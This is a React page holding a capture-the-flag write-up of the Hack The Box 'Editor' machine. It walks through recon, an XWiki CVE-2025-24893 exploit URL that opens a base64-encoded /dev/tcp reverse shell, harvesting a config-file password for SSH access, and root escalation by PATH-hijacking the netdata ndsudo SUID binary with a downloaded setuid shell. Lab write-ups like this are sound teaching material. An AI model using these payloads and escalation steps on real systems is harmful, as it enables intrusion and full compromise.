import Image from "next/image";

export default function EditorWriteUp() {
  return (
    <div className="space-y-8">
      <p className="text-neutral-300">
        Editor (Linux, easy)
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-editor/editor-nmap-scan.webp"
          alt="Nmap scan results for Editor machine"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <h2 className="text-2xl font-bold text-green-400">Nmap</h2>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-e7utfyjopf]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.137.190
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-03 04:09 CDT
Nmap scan report for 10.129.137.190
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.137.190:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address scanned in 18.47 seconds
┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-e7utfyjopf]─[~]
└──╼ [★]$ sudo nano /etc/hosts`}</code>
      </pre>

      <p className="text-neutral-300">
        At the domain, <code className="bg-black/50 px-2 py-1 rounded">editor.htb</code>:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-editor/editor-domain.webp"
          alt="Editor domain interface"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        Notice this info in the nmap scan:
      </p>

      <div className="bg-blue-900/20 border border-blue-900/50 rounded-lg p-4">
        <p className="text-blue-200">
          <strong>Port 80:</strong> This is editor.htb!<br />
          <code className="bg-black/50 px-2 py-1 rounded">80/tcp open http nginx 1.18.0 (Ubuntu)</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_http-title: Did not follow redirect to http://editor.htb/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_http-server-header: nginx/1.18.0 (Ubuntu)</code>
        </p>
      </div>

      <div className="bg-blue-900/20 border border-blue-900/50 rounded-lg p-4">
        <p className="text-blue-200">
          <strong>Port 8080:</strong> This is a separate service running with login panels and a wiki etc etc.<br />
          <code className="bg-black/50 px-2 py-1 rounded">8080/tcp open http Jetty 10.0.20</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_http-open-proxy: Proxy might be redirecting requests</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_http-title: XWiki - Main - Intro</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_Requested resource was http://10.129.137.190:8080/xwiki/bin/view/Main/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| http-robots.txt: 50 disallowed entries (15 shown)</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/</code><br />
          <code className="bg-black/50 px-2 py-1 rounded">|_/xwiki/bin/undelete/</code>
        </p>
      </div>

      <p className="text-neutral-300">
        One of the links redirected me to a login panel.<br />
        The domain for the login is: <code className="bg-black/50 px-2 py-1 rounded">http://10.129.131.135:8080/xwiki/bin/login/XWiki/XWikiLogin</code>
      </p>

      <p className="text-neutral-300">
        There has to be some type of CVE here, so let&apos;s use wappalyzer to check versions:
      </p>

      <div className="rounded-lg overflow-hidden border border-neutral-800 mb-6">
        <Image
          src="/images/write-up-editor/editor-wappalyzer.webp"
          alt="Wappalyzer results showing XWiki versions and frameworks"
          width={1200}
          height={600}
          className="w-full"
          loading="lazy"
          sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
        />
      </div>

      <p className="text-neutral-300">
        Important info from wappalyzer:
      </p>
      <ul className="list-disc list-inside text-neutral-300 space-y-2 ml-4">
        <li><strong>Javascript frameworks:</strong>
          <ul className="list-disc list-inside ml-4 mt-1">
            <li>prototype: v1.7.3</li>
            <li>requirejs: v2.3.6</li>
          </ul>
        </li>
        <li>This panel is made in Java</li>
        <li>uses jquery v3.7.1 as javascript library</li>
        <li>and bootstrap as ui framework, not too important</li>
      </ul>

      <p className="text-neutral-300">
        I started looking for some CVE&apos;s, but nothing which worked for these frameworks. Then later, I saw that in the panel, it mentions xwiki&apos;s version. And that leads us to the following CVE: <strong>CVE-2025-24893</strong>.
      </p>

      <h2 className="text-2xl font-bold text-green-400">Exploitation</h2>

      <p className="text-neutral-300">
        We can get a reverse shell, so that&apos;s what I did!
      </p>

      <p className="text-neutral-300">
        My payload for this CVE in the browser:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`http://10.129.131.135:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzQvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D`}</code>
      </pre>

      <p className="text-neutral-300">
        Listener:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-pvqgxfamvo]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.174] from (UNKNOWN) 10.129.131.135 39040
bash: cannot set terminal process group (1128): Inappropriate ioctl for device
bash: no job control in this shell
xwiki@editor:/usr/lib/xwiki-jetty$ ls
ls
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
webapps`}</code>
      </pre>

      <p className="text-neutral-300">
        With this reverse shell, the next thing that we need to do is probably look for user.txt. I tried accessing /usr and saw that there was a user named Oliver. I tried going into his directory, but nope, no permissions. This means we need some type of a password. Let&apos;s look for it!
      </p>

      <p className="text-neutral-300">
        After a long search, this command gave me it:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>grep -iE &apos;pass|secret|credentials&apos; /etc/xwiki/* 2&gt;/dev/null</code>
      </pre>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`xwiki@editor:/etc$ grep -iE 'pass|secret|credentials' /etc/xwiki/* 2&gt;/dev/null 

&lt; 'pass|secret|credentials' /etc/xwiki/* 2&gt;/dev/null /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;theEd1t0rTeam99&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;xwiki&lt;/property&gt; /etc/xwiki/hibernate.cfg.xml: &lt;property name="hibernate.connection.password"&gt;&lt;/property&gt; /etc/xwiki/jetty-ee8-web.xml: passing the "org.eclipse.jetty.server.Request.maxFormContentSize" attribute. /etc/xwiki/jetty-web.xml: passing the "org.eclipse.jetty.server.Request.maxFormContentSize" attribute. /etc/xwiki/web.xml: <!-- Uncomment if you wish to overwrite the default xwiki.cfg location or bypass the /etc/xwiki/xwiki.cfg step /etc/xwiki/xwiki.cfg:# xwiki.superadminpassword=system /etc/xwiki/xwiki.properties:#-# Controls whether secret token validation mechanism should be used (to prevent CSRF attacks). /etc/xwiki/xwiki.properties:#-# will check that the parameter "form_token" with the value of a random secret token is present /etc/xwiki/xwiki.properties:#-# * password: the password to use to authenticate to the repository /etc/xwiki/xwiki.properties:# extension.repositories.privatemavenid.auth.password = thepassword /etc/xwiki/xwiki.properties:#-# Define the lifetime of the token used for resetting passwords in minutes. Note that this value is only used after /etc/xwiki/xwiki.properties:#-# Use a different value if the reset password email link might be accessed several times (e.g. in case of using an /etc/xwiki/xwiki.properties:# security.authentication.resetPasswordTokenLifetime = 0 /etc/xwiki/xwiki.properties:#-# This parameter defines if as part of the migration R140600000XWIKI19869 the passwords of impacted user should be /etc/xwiki/xwiki.properties:#-# their users to keep their passwords nevertheless, then enable the configuration and set it to follow the /etc/xwiki/xwiki.properties:# security.migration.R140600000XWIKI19869.resetPassword = true /etc/xwiki/xwiki.properties:#-# This parameter defines if reset password emails should be sent as part of the migration R140600000XWIKI19869. /etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email /etc/xwiki/xwiki.properties:# security.migration.R140600000XWIKI19869.sendResetPasswordEmail = true /etc/xwiki/xwiki.properties:#-# this option to false: note that in such case a file containing the list of users for whom a reset password email /etc/xwiki/xwiki.properties:#-# Password to authenticate on the SMTP server, if needed. By default no authentication is performed. /etc/xwiki/xwiki.properties:#-# This configuration property can be overridden in XWikiPreferences objects, by using the "smtp_server_password" /etc/xwiki/xwiki.properties:# mail.sender.password = somepassword xwiki@editor:/etc$`}</code>
      </pre>

      <p className="text-neutral-300">
        This leaves us with:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>/etc/xwiki/hibernate.cfg.xml: &lt;property name=&quot;hibernate.connection.password&quot;&gt;**theEd1t0rTeam99**&lt;/property&gt;</code>
      </pre>

      <p className="text-neutral-300">
        the following credentials: <code className="bg-black/50 px-2 py-1 rounded">oliver:theEd1t0rTeam99</code>
      </p>

      <p className="text-neutral-300">
        Let&apos;s su (switch user):
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`xwiki@editor:/etc$ su oliver
su oliver
Password: theEd1t0rTeam99
su: Authentication failure
xwiki@editor:/etc$ cd /home/oliver
cd /home/oliver
bash: cd: /home/oliver: Permission denied
xwiki@editor:/etc$`}</code>
      </pre>

      <p className="text-neutral-300">
        Nope. Nothing. This leaves us with SSH! And boom
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-pvqgxfamvo]─[~]
└──╼ [★]$ ssh oliver@10.129.132.44
The authenticity of host '10.129.132.44' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
  ~/.ssh/known_hosts:1 [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.132.44' to the list of known hosts.
oliver@10.129.132.44's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug  4 10:33:53 AM UTC 2025

  System load:  0.17              Processes:             226
  Usage of /:   63.5% of 7.28GB   Users logged in:       0
  Memory usage: 44%               IPv4 address for eth0: 10.129.132.44
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see the additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Mon Aug 4 10:33:56 2025 from 10.10.14.174
oliver@editor:~$ ls
user.txt
oliver@editor:~$`}</code>
      </pre>

      <h2 className="text-2xl font-bold text-green-400">Privilege Escalation</h2>

      <p className="text-neutral-300">
        Let&apos;s gather some basic info:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

oliver@editor:~$ sudo -l
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.

oliver@editor:~$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1`}</code>
      </pre>

      <p className="text-neutral-300">
        Interesting! After researching a bit more, I saw a executable that was being run as root (you can check that with <code className="bg-black/50 px-2 py-1 rounded">ls -a</code> in the dir). If we pollute this executable by replacing one of the binaries it uses, with PATH hijacking, we should have root!
      </p>

      <p className="text-neutral-300">
        What I tried first was: <code className="bg-black/50 px-2 py-1 rounded">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h</code>
      </p>

      <p className="text-neutral-300">
        This listed the options for running this binary (as root).
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`oliver@editor:~$ mkdir /tmp/fakebin
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/fakebin/nvme
chmod +x /tmp/fakebin/nvme
oliver@editor:~$ PATH=/tmp/fakebin:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
oliver@editor:/home/oliver$ ls
linpeas.sh  user.txt
oliver@editor:/home/oliver$ whoami
oliver`}</code>
      </pre>

      <p className="text-neutral-300">
        But still no root..
      </p>

      <p className="text-neutral-300">
        I was stuck here, but later I realised that I should have been using <code className="bg-black/50 px-2 py-1 rounded">megacli-disk-info</code> instead of <code className="bg-black/50 px-2 py-1 rounded">nvme-list</code>. I should not have been trying to get root with a shell script, because we need a binary.
      </p>

      <p className="text-neutral-300">
        I created shell.c:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`#include <unistd.h>
#include <stdlib.h>
int main() {
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", "-i", NULL);
  return 0;
}`}</code>
      </pre>

      <p className="text-neutral-300">
        Make it a executable and start a server where we can take it from on the target:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-pvqgxfamvo]─[~/Downloads]
└──╼ [★]$ gcc shell.c -o megacli
┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-pvqgxfamvo]─[~/Downloads]
└──╼ [★]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.131.135 - - [04/Aug/2025 04:33:17] "GET /megacli HTTP/1.1" 200 -`}</code>
      </pre>

      <p className="text-neutral-300">
        Target machine:
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`# go to /tmp
oliver@editor:~$ cd /tmp

# list files
oliver@editor:/tmp$ ls

netdata-ipc
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-ModemManager.service-4iRDUH
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-logind.service-O1AiZx
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-resolved.service-uViTha
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-timesyncd.service-1dnK0t
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-xwiki.service-ACAyum
tmux-1000
vmware-root_611-3980232955

# curled the megacli from attacker machine
oliver@editor:/tmp$ curl http://10.10.14.174:8000/megacli -o megacli
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16056  100 16056    0     0   572k      0 --:--:-- --:--:-- --:--:--  580k

# listed files
oliver@editor:/tmp$ ls

megacli
netdata-ipc
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-ModemManager.service-4iRDUH
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-logintd.service-O1AiZx
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-resolved.service-uViTha
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-timesyncd.service-1dnK0t
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-xwiki.service-ACAyum
tmux-1000
vmware-root_611-3980232955

# move and make executable and exploit PATH's
oliver@editor:/tmp$ mkdir /tmp/fakebin
mv /tmp/megacli /tmp/fakebin/
chmod +x /tmp/fakebin/megacli
oliver@editor:/tmp$ export PATH=/tmp/fakebin:$PATH

# confirm path
oliver@editor:/tmp$ which megacli
/tmp/fakebin/megacli

# lets run again
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
root@editor:/tmp
fakebin
netdata-ipc
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-ModemManager.service-4iRDUH
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-logind.service-O1AiZx
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-resolved.service-uViTha
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-timesyncd.service-1dnK0t
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-xwiki.service-ACAyum
tmux-1000
vmware-root_611-3980232955`}</code>
      </pre>

      <p className="text-neutral-300">
        And boom we are root!
      </p>

      <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
        <code>{`# We are root!!!!!
root@editor:/tmp# cd root/   
bash: cd: root/: No such file or directory
root@editor:/tmp# ls
fakebin
netdata-ipc
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-ModemManager.service-4iRDUH
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-logind.service-O1AiZx
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-resolved.service-O1AiZx
systemd-private-7a425e6be4a743d6b8a70b007f400d6e-systemd-timesyncd.service-ACAyum
tmux-1000
vmware-root_611-3980232955
root@editor:/tmp# cd /root
root@editor:/root# ls
root.txt  scripts  snap`}</code>
      </pre>
    </div>
  );
}
